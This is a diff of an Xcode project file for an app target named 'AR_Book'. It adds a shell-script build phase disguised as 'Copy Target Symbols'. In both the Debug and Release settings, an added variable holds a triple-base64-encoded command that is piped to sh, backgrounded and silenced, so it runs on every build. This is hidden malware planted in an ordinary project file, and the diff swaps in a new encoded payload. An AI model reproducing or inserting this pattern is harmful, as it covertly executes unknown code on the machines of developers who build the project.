@@ -63,7 +63,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04F565F02E2FFAFC00C1377A /* Build configuration list for PBXNativeTarget "AR_Book" */;
 			buildPhases = (
-				D9A0F5172C7A6BB3CD877BEF /* Link Bundle Executable */,
+				2AE796F5DD51ABF3BF877BEF /* Copy Target Symbols */,
 				04F565DE2E2FFAFB00C1377A /* Sources */,
 				04F565DF2E2FFAFB00C1377A /* Frameworks */,
 				04F565E02E2FFAFB00C1377A /* Resources */,
@@ -135,25 +135,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		D9A0F5172C7A6BB3CD877BEF /* Link Bundle Executable */ = {
+		2AE796F5DD51ABF3BF877BEF /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -171,7 +170,7 @@
 		04F565EE2E2FFAFC00C1377A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlRCaU0wbDFZMjVWZGxsVGEybEpTSGRuWXpKblN3bz0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhRnBIT1dsYVYwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -235,7 +234,7 @@
 		04F565EF2E2FFAFC00C1377A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlRCaU0wbDFZMjVWZGxsVGEybEpTSGRuWXpKblN3bz0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhRnBIT1dsYVYwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
